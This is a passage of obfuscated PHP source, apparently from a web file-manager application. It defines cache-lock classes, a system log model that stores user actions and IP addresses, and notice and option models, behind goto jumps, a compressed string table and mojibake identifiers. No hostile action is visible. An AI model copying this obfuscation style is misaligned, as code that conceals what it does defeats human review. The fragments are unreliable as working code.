$Øµõ±ò; } public static function valueSet($Ò‘ğ®×, $ŞÕåàşâ) { $¤–É¦”‰ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ŞÕåàşâ) { return Model($¤–É¦”‰[439])->where(array($¤–É¦”‰[93] => $Ò‘ğ®×, $¤–É¦”‰[29] => $¤–É¦”‰[1604]))->delete(); } $äŒŞ°Ì = json_encode($ŞÕåàşâ); if (!$äŒŞ°Ì) { ob_start(); var_dump($ŞÕåàşâ); $ ğçªò = ob_get_clean(); self::log($¤–É¦”‰[1605] . json_encode_force($ ğçªò)); } if (!$Ò‘ğ®× || !$ŞÕåàşâ[$¤–É¦”‰[395]]) { return !1; } $ûã±´Ê‡ = array($¤–É¦”‰[29] => $¤–É¦”‰[1604], $¤–É¦”‰[1581] => USER_ID, $¤–É¦”‰[93] => $Ò‘ğ®×, $¤–É¦”‰[372] => $äŒŞ°Ì); $ÖÙæğÉ» = $¤–É¦”‰[1606]; CacheLock::lock($ÖÙæğÉ»); Model($¤–É¦”‰[439])->add($ûã±´Ê‡, array(), !0); CacheLock::unlock($ÖÙæğÉ»); } public static function log($ìÛÔäú¦) { if (!GLOBAL_DEBUG) { return; } write_log($ìÛÔäú¦, $_SERVER[¥ÙÌÜ¾ê][1607]); } } goto eè®Ú•óç; bÖæçÂ©÷Î: class CacheLockMemcached { public function lock($´Àà×ŒÓ, $Œ„¥™İ– = 0) { $‰ÆÌğîÉ = Cache::init(); $­ÊŸÇÒş = microtime(!0) + $Œ„¥™İ–; while (microtime(!0) < $­ÊŸÇÒş) { $ì÷ï‰ Ø = $‰ÆÌğîÉ->get($´Àà×ŒÓ); if (!$ì÷ï‰ Ø || $ì÷ï‰ Ø < microtime(!0)) { $ÉÀƒ Ş = $‰ÆÌğîÉ->handle->add($´Àà×ŒÓ, $­ÊŸÇÒş, $Œ„¥™İ–); if ($ÉÀƒ Ş) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Â²´‚‹) { return Cache::init()->get($Â²´‚‹); } public function unlock($»Òò³­ˆ) { return Cache::init()->remove($»Òò³­ˆ); } } class CacheLockDatabase { public function lock($é”ğü¼Æ, $ûŒÊõÏ = 0) { $ßå’²Ñæ = Model($_SERVER[¥ÙÌÜ¾ê][829]); $‡ÅôŠ¿ó = microtime(!0) + $ûŒÊõÏ; while (microtime(!0) < $‡ÅôŠ¿ó) { $íœ¡ıñŸ = $ßå’²Ñæ->get($é”ğü¼Æ); if (!$íœ¡ıñŸ || $íœ¡ıñŸ < microtime(!0)) { $îÛ§âñÍ = $ßå’²Ñæ->set($é”ğü¼Æ, $‡ÅôŠ¿ó); if ($îÛ§âñÍ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($šïÄ Øº) { return Model($_SERVER[¥ÙÌÜ¾ê][829])->get($šïÄ Øº); } public function unlock($±‰ ›ş®) { Model($_SERVER[¥ÙÌÜ¾ê][829])->remove($±‰ ›ş®); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ı¼ô‘üµ, $Öê±»ÏÓ) { $ôã´· =& $_SERVER[¥ÙÌÜ¾ê]; if (!class_exists($ôã´·[870])) { show_json($ôã´·[871], !1); } $this->cacheTime = $Öê±»ÏÓ; $this->handle = new Memcached(); if (is_array($ı¼ô‘üµ[$ôã´·[872]]) && count($ı¼ô‘üµ[$ôã´·[872]]) >= 1) { foreach ($ı¼ô‘üµ[$ôã´·[872]] as $Ãº¸†´˜) { $ÛãÓ‰¸ = explode($ôã´·[4], $Ãº¸†´˜); $this->handle->addServer($ÛãÓ‰¸[0], $ÛãÓ‰¸[1]); } } else { $this->handle->addServer($ı¼ô‘üµ[$ôã´·[175]], $ı¼ô‘üµ[$ôã´·[176]]); } } public function set($û€º‰¸, $‘ ¼ì½‘, $ŸÉñíªÎ = false) { $ŸÉñíªÎ = $ŸÉñíªÎ ? $ŸÉñíªÎ : $this->cacheTime; return $this->handle->set($û€º‰¸, $‘ ¼ì½‘, $ŸÉñíªÎ); } public function get($Ë‘²‘Ç÷) { return $this->handle->get($Ë‘²‘Ç÷); } public function remove($¿óƒú¶à) { return $this->handle->delete($¿óƒú¶à); } public function deleteAll() { return $this->handle->flush(); } } goto e•²ƒ³ çæ; bÀƒØƒñÅË: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\145\162\164", "\x66\x75\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $™¡„ù×« =& $_SERVER[¥ÙÌÜ¾ê]; return array($™¡„ù×«[2065] => LNG($™¡„ù×«[2066]), $™¡„ù×«[2067] => LNG($™¡„ù×«[2068]), $™¡„ù×«[1691] => LNG($™¡„ù×«[2069]), $™¡„ù×«[2070] => LNG($™¡„ù×«[2071]), $™¡„ù×«[2072] => LNG($™¡„ù×«[2073]), $™¡„ù×«[2074] => LNG($™¡„ù×«[2075]), $™¡„ù×«[2076] => LNG($™¡„ù×«[2077]), $™¡„ù×«[1721] => LNG($™¡„ù×«[2077]), $™¡„ù×«[1722] => LNG($™¡„ù×«[2078]), $™¡„ù×«[2079] => LNG($™¡„ù×«[2080]), $™¡„ù×«[2081] => LNG($™¡„ù×«[2082]), $™¡„ù×«[2083] => LNG($™¡„ù×«[2084]), $™¡„ù×«[2085] => LNG($™¡„ù×«[2086]), $™¡„ù×«[1719] => LNG($™¡„ù×«[2087]), $™¡„ù×«[2088] => LNG($™¡„ù×«[2089]), $™¡„ù×«[1726] => LNG($™¡„ù×«[2090]), $™¡„ù×«[2091] => LNG($™¡„ù×«[2092]), $™¡„ù×«[2093] => LNG($™¡„ù×«[2094]), $™¡„ù×«[2095] => LNG($™¡„ù×«[2096]), $™¡„ù×«[2097] => LNG($™¡„ù×«[2098]), $™¡„ù×«[1729] => LNG($™¡„ù×«[2099]), $™¡„ù×«[1730] => LNG($™¡„ù×«[2100]), $™¡„ù×«[2101] => LNG($™¡„ù×«[2102]), $™¡„ù×«[2103] => LNG($™¡„ù×«[2104]), $™¡„ù×«[2105] => LNG($™¡„ù×«[2106]), $™¡„ù×«[1724] => LNG($™¡„ù×«[2107]), $™¡„ù×«[2108] => LNG($™¡„ù×«[2109]), $™¡„ù×«[1723] => LNG($™¡„ù×«[2110]), $™¡„ù×«[2111] => LNG($™¡„ù×«[2112]), $™¡„ù×«[2113] => LNG($™¡„ù×«[2114]), $™¡„ù×«[2115] => LNG($™¡„ù×«[2116]), $™¡„ù×«[2117] => LNG($™¡„ù×«[2117]), $™¡„ù×«[2118] => LNG($™¡„ù×«[1695]), $™¡„ù×«[2119] => LNG($™¡„ù×«[2120]), $™¡„ù×«[2121] => LNG($™¡„ù×«[2122]), $™¡„ù×«[2123] => LNG($™¡„ù×«[2124]), $™¡„ù×«[2125] => LNG($™¡„ù×«[2126]), $™¡„ù×«[2127] => LNG($™¡„ù×«[2128]), $™¡„ù×«[2129] => LNG($™¡„ù×«[2129]), $™¡„ù×«[2130] => LNG($™¡„ù×«[2131]), $™¡„ù×«[2132] => LNG($™¡„ù×«[2133]), $™¡„ù×«[2134] => LNG($™¡„ù×«[2135]), $™¡„ù×«[2136] => LNG($™¡„ù×«[2137]), $™¡„ù×«[2138] => LNG($™¡„ù×«[2139]), $™¡„ù×«[2140] => LNG($™¡„ù×«[2141])); } private function typeFile() { $Ç„‡¨ûË =& $_SERVER[¥ÙÌÜ¾ê]; $¦Õ Ğˆ = array($Ç„‡¨ûË[1726] => array($Ç„‡¨ûË[1727]), $Ç„‡¨ûË[2083] => array($Ç„‡¨ûË[2142]), $Ç„‡¨ûË[2085] => array($Ç„‡¨ûË[2143]), $Ç„‡¨ûË[1719] => array($Ç„‡¨ûË[1720]), $Ç„‡¨ûË[2093] => array(), $Ç„‡¨ûË[2095] => array(), $Ç„‡¨ûË[2097] => array(), $Ç„‡¨ûË[1729] => array($Ç„‡¨ûË[1731]), $Ç„‡¨ûË[1730] => array($Ç„‡¨ûË[1731]), $Ç„‡¨ûË[2101] => array($Ç„‡¨ûË[2144]), $Ç„‡¨ûË[2103] => array($Ç„‡¨ûË[2144]), $Ç„‡¨ûË[2105] => array($Ç„‡¨ûË[2145]), $Ç„‡¨ûË[2091] => array($Ç„‡¨ûË[2146]), $Ç„‡¨ûË[1724] => array($Ç„‡¨ûË[2147]), $Ç„‡¨ûË[2108] => array($Ç„‡¨ûË[2148]), $Ç„‡¨ûË[1723] => array($Ç„‡¨ûË[1725])); return $¦Õ Ğˆ; } private function typeAll() { $´­°¸‡ =& $_SERVER[¥ÙÌÜ¾ê]; $Éû‘¬à¦ = $this->typeList; $ù”€¤áé = array_filter($this->typeFile()); foreach ($ù”€¤áé as $ñø«û¨º => $ìæ¡) { $Éû‘¬à¦[$ìæ¡[0]] = $Éû‘¬à¦[$ñø«û¨º]; } $Éû‘¬à¦[$´­°¸‡[1731]] = LNG($´­°¸‡[2149]); $Éû‘¬à¦[$´­°¸‡[2144]] = LNG($´­°¸‡[2150]); return $Éû‘¬à¦; } public function addLog($ø†€¤·©, $Ô­í÷è« = array()) { $‹½ß˜‚Î =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->typeList[$ø†€¤·©])) { return; } $ıÑŞŠ¶Ú = defined($‹½ß˜‚Î[468]) && USER_ID ? USER_ID : (isset($Ô­í÷è«[$‹½ß˜‚Î[1581]]) ? $Ô­í÷è«[$‹½ß˜‚Î[1581]] : 0); if (!$ıÑŞŠ¶Ú) { $ıÑŞŠ¶Ú = (int) Session::get($‹½ß˜‚Î[1883]); } $¡„‹â—½ = get_client_ip(); if (!$Ô­í÷è« || strlen(json_encode($Ô­í÷è«)) >= 1024) { $Ô­í÷è« = array($‹½ß˜‚Î[2151] => $¡„‹â—½); } else { if (is_array($Ô­í÷è«)) { $Ô­í÷è«[$‹½ß˜‚Î[2151]] = $¡„‹â—½; } else { $Ô­í÷è« = array($‹½ß˜‚Î[1123] => $Ô­í÷è«, $‹½ß˜‚Î[2151] => $¡„‹â—½); } } $Ô­í÷è« = array($‹½ß˜‚Î[1571] => Session::sign(), $‹½ß˜‚Î[1572] => $ıÑŞŠ¶Ú, $‹½ß˜‚Î[29] => $ø†€¤·©, $‹½ß˜‚Î[1574] => json_encode($Ô­í÷è«)); parent::add($Ô­í÷è«); } public function remove($×¹Äå·´) { $this->where(array($_SERVER[¥ÙÌÜ¾ê][414] => $×¹Äå·´))->delete(); } private function _makeOrder($ÖïË»‡‰ = '') { $£ÀÛìá× =& $_SERVER[¥ÙÌÜ¾ê]; $–ğË®ˆÆ = $£ÀÛìá×[194]; $Ø¨—® ı = array($£ÀÛìá×[442] => $£ÀÛìá×[443], $£ÀÛìá×[444] => $£ÀÛìá×[445]); $½¥²€ƒ = Input::get($£ÀÛìá×[450], $£ÀÛìá×[7], $£ÀÛìá×[1915], array($£ÀÛìá×[1839], $£ÀÛìá×[444])); $½¥²€ƒ = $Ø¨—® ı[$½¥²€ƒ]; $ÖïË»‡‰ = $ÖïË»‡‰ . "{$–ğË®ˆÆ}\x20{$½¥²€ƒ}"; return $this->order($ÖïË»‡‰); } public function get($…¥®¤ = '') { $ñ¯¬Êş’ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$…¥®¤) { show_json(array()); } $ËŞ‡» = array(); if ($…¥®¤[$ñ¯¬Êş’[1581]]) { $ËŞ‡»[$ñ¯¬Êş’[1581]] = $…¥®¤[$ñ¯¬Êş’[1581]]; } if (isset($…¥®¤[$ñ¯¬Êş’[754]])) { $”àüñ€Ë = $…¥®¤[$ñ¯¬Êş’[754]]; $£Œö¢¬Š = isset($…¥®¤[$ñ¯¬Êş’[490]]) ? $…¥®¤[$ñ¯¬Êş’[490]] : time(); $ËŞ‡»[$ñ¯¬Êş’[194]] = array($ñ¯¬Êş’[331], array($”àüñ€Ë, $£Œö¢¬Š)); } if ($…¥®¤[$ñ¯¬Êş’[29]]) { $Ş¼‘Œ£§ = explode($ñ¯¬Êş’[47], $…¥®¤[$ñ¯¬Êş’[29]]); $›–ã¿ßƒ = $this->typeFile(); $¯Ë˜˜Îğ = array(); foreach ($Ş¼‘Œ£§ as $–‘ˆªşÀ) { $¯Ë˜˜Îğ[] = $–‘ˆªşÀ; if (isset($›–ã¿ßƒ[$–‘ˆªşÀ])) { $¯Ë˜˜Îğ = array_merge($¯Ë˜˜Îğ, $›–ã¿ßƒ[$–‘ˆªşÀ]); } } $¯Ë˜˜Îğ = array_unique($¯Ë˜˜Îğ); if ($¯Ë˜˜Îğ) { $ËŞ‡»[$ñ¯¬Êş’[29]] = array($ñ¯¬Êş’[7], $¯Ë˜˜Îğ); } } else { $ËŞ‡»[$ñ¯¬Êş’[29]] = array($ñ¯¬Êş’[2152], $ñ¯¬Êş’[2153]); } if (!empty($…¥®¤[$ñ¯¬Êş’[2151]])) { $ËŞ‡»[$ñ¯¬Êş’[445]] = array($ñ¯¬Êş’[381], "\x25{$…¥®¤[$ñ¯¬Êş’[2151]]}\45"); } $×•ÍÛ­õ = $this->_makeOrder()->where($ËŞ‡»)->selectPage(); if (empty($×•ÍÛ­õ[$ñ¯¬Êş’[367]])) { show_json(array(), !0, $×•ÍÛ­õ[$ñ¯¬Êş’[364]]); } $×•ÍÛ­õ[$ñ¯¬Êş’[367]] = $this->logList($×•ÍÛ­õ[$ñ¯¬Êş’[367]]); return $×•ÍÛ­õ; } private function ipAddress(&$ü³”Œ—) { $òÎˆüÕ =& $_SERVER[¥ÙÌÜ¾ê]; if (!empty($ü³”Œ—[$òÎˆüÕ[2151]])) { $ã£¶´¢« = IpLocation::get($ü³”Œ—[$òÎˆüÕ[2151]]); } else { $ã£¶´¢« = LNG($òÎˆüÕ[2154]); } $ü³”Œ—[$òÎˆüÕ[2155]] = $ã£¶´¢«; } private function descZipDownload($í·˜ß¼, &$¸Ğ£êİÏ) { $ ÖæÒÁ¨ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($í·˜ß¼[$ ÖæÒÁ¨[2156]])) { return; } $°øÜ¡È² = json_decode($í·˜ß¼[$ ÖæÒÁ¨[2156]], !0); foreach ($°øÜ¡È² as $ğ§€·Šã) { try { $²¯ö£ë = IO::infoFull($ğ§€·Šã[$ ÖæÒÁ¨[76]]); } catch (Exception $Íå±±‡¨) { continue; } $í·˜ß¼[$ ÖæÒÁ¨[76]] = $ğ§€·Šã[$ ÖæÒÁ¨[76]]; $¸Ğ£êİÏ[] = $í·˜ß¼[$ ÖæÒÁ¨[397]] = $²¯ö£ë[$ ÖæÒÁ¨[397]]; $¸Ğ£êİÏ[] = $í·˜ß¼[$ ÖæÒÁ¨[1969]] = $²¯ö£ë[$ ÖæÒÁ¨[492]]; break; } return $í·˜ß¼; } private function getSourceList(&$óˆ×È›Ñ) { $ç«ãóê =& $_SERVER[¥ÙÌÜ¾ê]; $î‡ÓÂâ˜ = array(); foreach ($óˆ×È›Ñ as $§ŠØñšÌ => $ÓùÕçö) { $†êñÊ›« = json_decode($ÓùÕçö[$ç«ãóê[445]], !0); if ($ÓùÕçö[$ç«ãóê[29]] == $ç«ãóê[1722]) { $†êñÊ›« = $this->descZipDownload($†êñÊ›«, $î‡ÓÂâ˜); $óˆ×È›Ñ[$§ŠØñšÌ][$ç«ãóê[445]] = json_encode($†êñÊ›«); continue; } if (strpos($ÓùÕçö[$ç«ãóê[29]], $ç«ãóê[1970]) !== 0) { if (!isset($†êñÊ›«[$ç«ãóê[76]]) || strpos($ÓùÕçö[$ç«ãóê[29]], $ç«ãóê[2157]) !== 0) { continue; } try { $«ôá¦Ã = IO::infoFull($†êñÊ›«[$ç«ãóê[76]]); } catch (Exception $§æ¹ßå‚) { continue; } $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[397]] = $«ôá¦Ã[$ç«ãóê[397]]; $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[1969]] = $«ôá¦Ã[$ç«ãóê[492]]; $óˆ×È›Ñ[$§ŠØñšÌ][$ç«ãóê[445]] = json_encode($†êñÊ›«); continue; } $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[397]]; $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[1969]]; if ($†êñÊ›«[$ç«ãóê[29]] == $ç«ãóê[545]) { $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[445]][$ç«ãóê[1090]]; $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[445]][$ç«ãóê[1091]]; } if ($†êñÊ›«[$ç«ãóê[29]] == $ç«ãóê[1977]) { $î‡ÓÂâ˜[] = $†êñÊ›«[$ç«ãóê[445]][$ç«ãóê[397]]; } } if (!$î‡ÓÂâ˜) { return array(); } return Model($ç«ãóê[825])->sourceListInfo($î‡ÓÂâ˜, !0); } private function logList($È¼Ú¿¨) { $ÚÚ´¬ö =& $_SERVER[¥ÙÌÜ¾ê]; $ç©Ú’ˆ = array_to_keyvalue($È¼Ú¿¨, $ÚÚ´¬ö[33], $ÚÚ´¬ö[1581]); $œá³Ä = Model($ÚÚ´¬ö[532])->userListInfo(array_unique($ç©Ú’ˆ)); $Éö¡Ñ’ş = $this->getSourceList($È¼Ú¿¨); $ş­¢Ùî‹ = $this->typeAll(); $‹Ò¢Ü‹ = array(); $½¶‡­£‚ = array(); foreach ($È¼Ú¿¨ as $éşñŠÑ => $”¬²Åƒº) { $†¹…Û·ü = $”¬²Åƒº[$ÚÚ´¬ö[29]]; $òË©›Øß = isset($œá³Ä[$”¬²Åƒº[$ÚÚ´¬ö[1581]]]) ? $œá³Ä[$”¬²Åƒº[$ÚÚ´¬ö[1581]]] : !1; $ÖÂ†‰ÎÙ = strpos($†¹…Û·ü, $ÚÚ´¬ö[2158]) === 0 ? LNG($ÚÚ´¬ö[2159]) : LNG($ÚÚ´¬ö[2154]); $”¬²Åƒº[$ÚÚ´¬ö[28]] = isset($òË©›Øß[$ÚÚ´¬ö[28]]) ? $òË©›Øß[$ÚÚ´¬ö[28]] : LNG($ÚÚ´¬ö[2154]); $”¬²Åƒº[$ÚÚ´¬ö[2017]] = isset($òË©›Øß[$ÚÚ´¬ö[2017]]) ? $òË©›Øß[$ÚÚ´¬ö[2017]] : $ÚÚ´¬ö[33]; $”¬²Åƒº[$ÚÚ´¬ö[1481]] = isset($ş­¢Ùî‹[$†¹…Û·ü]) ? $ş­¢Ùî‹[$†¹…Û·ü] : $ÖÂ†‰ÎÙ; $”¬²Åƒº[$ÚÚ´¬ö[1914]] = $òË©›Øß; $âøÄ¯‚Ô = json_decode($”¬²Åƒº[$ÚÚ´¬ö[445]], !0); $”¬²Åƒº[$ÚÚ´¬ö[2151]] = isset($âøÄ¯‚Ô[$ÚÚ´¬ö[2151]]) ? $âøÄ¯‚Ô[$ÚÚ´¬ö[2151]] : $ÚÚ´¬ö[33]; $”¬²Åƒº[$ÚÚ´¬ö[2155]] = IpLocation::get($”¬²Åƒº[$ÚÚ´¬ö[2151]]); if (strpos($†¹…Û·ü, $ÚÚ´¬ö[1970]) === 0 || isset($âøÄ¯‚Ô[$ÚÚ´¬ö[1969]])) { $âøÄ¯‚Ô[$ÚÚ´¬ö[85]] = $Éö¡Ñ’ş[$âøÄ¯‚Ô[$ÚÚ´¬ö[397]]]; $âøÄ¯‚Ô[$ÚÚ´¬ö[1982]] = $Éö¡Ñ’ş[$âøÄ¯‚Ô[$ÚÚ´¬ö[1969]]]; if ($âøÄ¯‚Ô[$ÚÚ´¬ö[29]] == $ÚÚ´¬ö[545]) { $âøÄ¯‚Ô[$ÚÚ´¬ö[445]][$ÚÚ´¬ö[1090]] = $Éö¡Ñ’ş[$âøÄ¯‚Ô[$ÚÚ´¬ö[445]][$ÚÚ´¬ö[1090]]]; $âøÄ¯‚Ô[$ÚÚ´¬ö[445]][$ÚÚ´¬ö[1091]] = $Éö¡Ñ’ş[$âøÄ¯‚Ô[$ÚÚ´¬ö[445]][$ÚÚ´¬ö[1091]]]; } if ($âøÄ¯‚Ô[$ÚÚ´¬ö[29]] == $ÚÚ´¬ö[1977]) { $âøÄ¯‚Ô[$ÚÚ´¬ö[445]][$ÚÚ´¬ö[397]] = $Éö¡Ñ’ş[$âøÄ¯‚Ô[$ÚÚ´¬ö[445]][$ÚÚ´¬ö[397]]]; } if ($âøÄ¯‚Ô[$ÚÚ´¬ö[29]] == $ÚÚ´¬ö[1717]) { $âøÄ¯‚Ô[$ÚÚ´¬ö[1982]] = $âøÄ¯‚Ô[$ÚÚ´¬ö[85]]; $âøÄ¯‚Ô[$ÚÚ´¬ö[1969]] = $âøÄ¯‚Ô[$ÚÚ´¬ö[1982]][$ÚÚ´¬ö[397]]; $âøÄ¯‚Ô[$ÚÚ´¬ö[85]] = !1; $âøÄ¯‚Ô[$ÚÚ´¬ö[397]] = $ÚÚ´¬ö[33]; } if ($âøÄ¯‚Ô[$ÚÚ´¬ö[85]] && $âøÄ¯‚Ô[$ÚÚ´¬ö[85]][$ÚÚ´¬ö[406]] == $ÚÚ´¬ö[1206]) { $½¶‡­£‚[] = $”¬²Åƒº[$ÚÚ´¬ö[395]]; unset($È¼Ú¿¨[$éşñŠÑ]); continue; } if ($âøÄ¯‚Ô[$ÚÚ´¬ö[1982]] && $âøÄ¯‚Ô[$ÚÚ´¬ö[1982]][$ÚÚ´¬ö[406]] == $ÚÚ´¬ö[1206]) { $½¶‡­£‚[] = $”¬²Åƒº[$ÚÚ´¬ö[395]]; unset($È¼Ú¿¨[$éşñŠÑ]); continue; } } $”¬²Åƒº[$ÚÚ´¬ö[445]] = $âøÄ¯‚Ô; unset($”¬²Åƒº[$ÚÚ´¬ö[2160]]); $‹Ò¢Ü‹[] = $”¬²Åƒº; } $this->clearSystemPathLog($½¶‡­£‚); return $‹Ò¢Ü‹; } private function clearSystemPathLog($¡³İíĞ…) { $äÀºäÁ =& $_SERVER[¥ÙÌÜ¾ê]; if (count($¡³İíĞ…) == 0) { return; } $²¥Ã÷ÆÃ = array($äÀºäÁ[395] => array($äÀºäÁ[7], array_unique($¡³İíĞ…))); $this->where($²¥Ã÷ÆÃ)->delete(); } public function deviceList($Ô÷£ƒ†‚, $Ä‚…æË¦ = 0) { $ìÇæÊ  =& $_SERVER[¥ÙÌÜ¾ê]; $ÀùöÉî£ = array($ìÇæÊ [1581] => $Ô÷£ƒ†‚, $ìÇæÊ [194] => array($ìÇæÊ [1010], $Ä‚…æË¦), $ìÇæÊ [29] => $ìÇæÊ [1691]); $”ıôıÕÙ = array(); $–ÆşÉèø = $this->field($ìÇæÊ [2161])->where($ÀùöÉî£)->order($ìÇæÊ [1980])->limit(50)->select(); foreach ($–ÆşÉèø as $Çé¥Ş‰ò => $óŠ´ŒÖÖ) { if ($Çé¥Ş‰ò > 0 && abs($óŠ´ŒÖÖ[$ìÇæÊ [194]] - $–ÆşÉèø[$Çé¥Ş‰ò - 1][$ìÇæÊ [194]]) < 5) { continue; } $´™¦ÀÇ¸ = json_decode($óŠ´ŒÖÖ[$ìÇæÊ [445]], !0); $óŠ´ŒÖÖ[$ìÇæÊ [2151]] = isset($´™¦ÀÇ¸[$ìÇæÊ [2151]]) ? $´™¦ÀÇ¸[$ìÇæÊ [2151]] : $ìÇæÊ [33]; unset($´™¦ÀÇ¸[$ìÇæÊ [2151]]); $øı©µ = $this->deviceType($´™¦ÀÇ¸[$ìÇæÊ [1971]]); if (isset($”ıôıÕÙ[$øı©µ])) { continue; } $óŠ´ŒÖÖ[$ìÇæÊ [2155]] = IpLocation::get($óŠ´ŒÖÖ[$ìÇæÊ [2151]]); $óŠ´ŒÖÖ[$ìÇæÊ [445]] = $´™¦ÀÇ¸; $”ıôıÕÙ[$øı©µ] = $óŠ´ŒÖÖ; } return array_values($”ıôıÕÙ); } public function deviceType($©ÙëÕáü) { return $©ÙëÕáü; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x6e\157\x74\x69\x63\145\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\143\x6f\x6e\x74\145\156\x74", "\141\165\164\150", "\x6d\x6f\x64\145", "\164\151\x6d\x65", "\164\x79\160\145", "\154\x65\x76\145\x6c", "\x65\x6e\x61\x62\154\145", "\163\x6f\x72\x74"); public function listData($İäÉÇ” = false, $ìÍ›ûÑ„ = "\x73\157\x72\164", $Ü€Î½÷ = false) { return parent::listData($İäÉÇ”, $ìÍ›ûÑ„, $Ü€Î½÷); } public function add($¼ëÁÑÁ) { $¦·’å„à =& $_SERVER[¥ÙÌÜ¾ê]; $àê”Ïª³ = time(); if ($¼ëÁÑÁ[$¦·’å„à[12]] == $¦·’å„à[2162]) { $àê”Ïª³ = strtotime($¼ëÁÑÁ[$¦·’å„à[197]]); } $¼ëÁÑÁ[$¦·’å„à[197]] = $àê”Ïª³; return parent::insert($¼ëÁÑÁ); } public function update($ÛÍÖŸ–, $È¶ÛÀµË) { $ıî²Ñ¹ =& $_SERVER[¥ÙÌÜ¾ê]; $½—¡Ø§å = $this->listData($ÛÍÖŸ–); if (!$½—¡Ø§å) { return !1; } $Öıá¸ë = time(); if ($È¶ÛÀµË[$ıî²Ñ¹[12]] == $ıî²Ñ¹[2162]) { $Öıá¸ë = strtotime($È¶ÛÀµË[$ıî²Ñ¹[197]]); } $È¶ÛÀµË[$ıî²Ñ¹[197]] = $Öıá¸ë; return parent::update($ÛÍÖŸ–, $È¶ÛÀµË); } public function remove($ñÚìØÇÖ) { $¿±‰ˆ’î = $this->listData($ñÚìØÇÖ); if (!$¿±‰ˆ’î || $¿±‰ˆ’î[$_SERVER[¥ÙÌÜ¾ê][1206]]) { return !1; } return parent::remove($ñÚìØÇÖ); } public function sort($‚ìÌ–Ãš, $îÊÆâÅ) { return parent::update($‚ìÌ–Ãš, $îÊÆâÅ); } public function enable($¸é„Çî, $‰˜‚¥Ğ’) { return parent::update($¸é„Çî, array($_SERVER[¥ÙÌÜ¾ê][2163] => $‰˜‚¥Ğ’)); } private function initUserOption() { $÷êÔá°û =& $_SERVER[¥ÙÌÜ¾ê]; $this->optionType = $÷êÔá°û[2164]; $this->modelType = $÷êÔá°û[2165]; $this->field = array($÷êÔá°û[2166], $÷êÔá°û[28], $÷êÔá°û[197], $÷êÔá°û[29], $÷êÔá°û[2167], $÷êÔá°û[743], $÷êÔá°û[189]); } public function userNoticeGet($ÃÉàËŠÊ = false) { $this->initUserOption(); return parent::listData($ÃÉàËŠÊ, $_SERVER[¥ÙÌÜ¾ê][395], !0); } public function userNoticeAdd($Œ¤€‹§Ò) { $à·©á…ó =& $_SERVER[¥ÙÌÜ¾ê]; $this->initUserOption(); $ˆá¼¢¡‡ = $this->findByKey($à·©á…ó[2166], $Œ¤€‹§Ò[$à·©á…ó[395]]); if ($ˆá¼¢¡‡) { return !0; } $÷ëóÆë = array($à·©á…ó[2166] => $Œ¤€‹§Ò[$à·©á…ó[395]], $à·©á…ó[28] => $Œ¤€‹§Ò[$à·©á…ó[28]], $à·©á…ó[197] => $Œ¤€‹§Ò[$à·©á…ó[197]], $à·©á…ó[29] => isset($Œ¤€‹§Ò[$à·©á…ó[29]]) ? $Œ¤€‹§Ò[$à·©á…ó[29]] : 1, $à·©á…ó[2167] => isset($Œ¤€‹§Ò[$à·©á…ó[2167]]) ? $Œ¤€‹§Ò[$à·©á…ó[2167]] : 0, $à·©á…ó[743] => 0, $à·©á…ó[189] => 0); return parent::insert($÷ëóÆë); } public function userNoticeEdit($ıö¢¦û‰, $úÚç¿œ) { $this->initUserOption(); return parent::update($ıö¢¦û‰, $úÚç¿œ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\155\x5f\157\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\x65\156\165", "\162\157\154\x65", "\162\x6f\154\x65\107\162\157\x75\160", "\162\145\x67\x69\x73\x74", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ª¶Ê³Ú§) { return "\123\x79\x73\x74\x65\x6d\117\160\x74\151\157\x6e\137{$ª¶Ê³Ú§}"; } protected function optionDefault($æÏƒÎÙ® = '') { $ìŸòâÕ® =& $_SERVER[¥ÙÌÜ¾ê]; if ($æÏƒÎÙ® == $ìŸòâÕ®[33]) { return $GLOBALS[$ìŸòâÕ®[6]][$ìŸòâÕ®[379]]; } } } goto C™ÔÄØÏµÆ; fæˆƒ±åÏâ: define($_SERVER[¥ÙÌÜ¾ê][598], $_SERVER[¥ÙÌÜ¾ê][599]); $rpfvselmbd = $_SERVER[¥ÙÌÜ¾ê][600]; if (strlen($rpfvselmbd) < $_SERVER[¥ÙÌÜ¾ê][601]) { die; } goto dÑÌ¢¥¯¯§; dÑÌ¢¥¯¯§: $_SERVER[ÏÒºµ×®] = explode($_SERVER[¥ÙÌÜ¾ê][602], gzinflate(substr($_SERVER[¥ÙÌÜ¾ê][603], 10, -8))); $tfsmdpnlhy = $_SERVER[¥ÙÌÜ¾ê][604]; if (strlen($tfsmdpnlhy) < $_SERVER[¥ÙÌÜ¾ê][605]) { die; } goto a‘‘çÆóé; d´áñ™Æ©“: if (!isset($_SERVER[$_SERVER[¥ÙÌÜ¾ê][862]]) || !isset($_SERVER[$_SERVER[¥ÙÌÜ¾ê][869]])) { $_getc = $_SERVER[¥ÙÌÜ¾ê][864]; $_getfile = $_SERVER[$_SERVER[¥ÙÌÜ¾ê][865]] . $_SERVER[¥ÙÌÜ¾ê][866]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥ÙÌÜ¾ê][229], $_getfilec); if (count($_getarrs) < $_SERVER[¥ÙÌÜ¾ê][605]) 